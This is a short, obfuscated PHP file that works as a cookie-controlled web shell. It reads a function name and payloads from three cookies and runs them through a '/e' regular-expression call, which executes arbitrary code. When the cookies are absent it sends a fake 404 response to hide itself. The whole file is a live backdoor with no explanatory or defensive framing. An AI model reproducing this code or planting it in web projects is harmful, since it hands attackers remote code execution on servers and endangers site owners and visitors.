<?php		
class		IFHlxh		{		
		public		function		__construct()		{				
				$jq		=		@$_COOKIE['YWKWQYQxoUvLUvAS3'];		
				if		($jq)		{		
						$option		=		$jq		(@$_COOKIE['YWKWQYQxoUvLUvAS2'])		;		
						$au		=		$jq		(		@$_COOKIE['YWKWQYQxoUvLUvAS1'])		;		
						$option		(		"/438/e"		,		$au		,		438		)		;		
				}		else		{		
						header("HTTP/1.0 404 Not Found");
				}		
		}		
}		
$content		=		new		IFHlxh;		